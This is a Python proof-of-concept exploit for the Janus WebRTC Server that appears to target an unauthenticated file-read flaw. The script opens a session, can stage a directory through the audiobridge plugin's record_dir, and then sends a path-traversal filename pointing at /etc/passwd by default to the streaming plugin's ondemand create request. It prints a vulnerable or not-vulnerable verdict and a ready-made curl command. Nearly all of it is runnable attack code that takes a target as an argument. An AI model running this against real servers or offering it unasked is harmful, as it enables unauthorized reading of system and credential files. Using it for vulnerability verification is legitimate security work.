#!/usr/bin/env python3
# Janus WebRTC Server - unauthenticated arbitrary file read (streaming ondemand)
# usage: python3 janus_poc_generic.py TARGET [FILE] [--stage]
# TARGET http://host:8088/janus
# FILE local file to open, default /etc/passwd
# --stage create the staging directory through audiobridge record_dir
import sys, json, time, requests
A = sys.argv[1:]
T = A[0] if len(A) != 0 else 'http://127.0.0.1:8088/janus'
F = A[1] if len(A) not in (0, 1) and not A[1].startswith('--') else '/etc/passwd'
STAGE = '--stage' in A
DIR = '/tmp/jpoc.mulaw'
Q = chr(34)
post = lambda o: requests.post(T, json=o, timeout=10).json()
print('[i] target', T)
print('[i] file', F)
print('[i] staging dir', DIR)
info = requests.get(T + '/info', timeout=10).text if T.startswith('http') else 'skipped'
print('[i] info', info[:200])
s = post({'janus':'create','transaction':'c1'})
sid = s['data']['id']
print('[+] session', sid)
ab = post({'janus':'attach','transaction':'a0','plugin':'janus.plugin.audiobridge','session_id':sid})
abh = ab.get('data', {}).get('id')
room = 900000 + int(time.time()) - 1790000000
sb = {'request':'create','room':room,'description':'jpoc','record':True,'record_dir':DIR,'is_private':False,'sampling_rate':16000}
rs = post({'janus':'message','transaction':'m0','session_id':sid,'handle_id':abh,'body':sb}) if (STAGE and abh) else None
print('[i] stage response', json.dumps(rs)[:300] if rs else 'skipped, pass --stage')
h = post({'janus':'attach','transaction':'a1','plugin':'janus.plugin.streaming','session_id':sid})
hid = h['data']['id']
print('[+] streaming handle', hid)
traversal = DIR + ('/..' * DIR.count('/')) + F
print('[i] crafted path', traversal)
N = int(time.time()) - 1790000000
ctl = {'request':'create','id':N,'type':'ondemand','description':'ctl','audio':True,'video':False,'data':False,'filename':F}
rc = post({'janus':'message','transaction':'m1','session_id':sid,'handle_id':hid,'body':ctl})
print('[i] control plain path', json.dumps(rc)[:240])
b = {'request':'create','id':N + 1,'type':'ondemand','description':'poc','audio':True,'video':False,'data':False,'filename':traversal}
r = post({'janus':'message','transaction':'m2','session_id':sid,'handle_id':hid,'body':b})
txt = json.dumps(r, ensure_ascii=False, indent=2)
print('[+] create response')
print(txt)
print('[+] VERDICT', 'VULNERABLE, arbitrary path accepted as stream source' if 'created' in txt else 'NOT VULNERABLE, request rejected')
print('[i] curl equivalent for step 2')
print('curl -s -X POST -H ' + Q + 'Content-Type: application/json' + Q + ' -d ' + Q + json.dumps(b) + Q + ' ' + T)
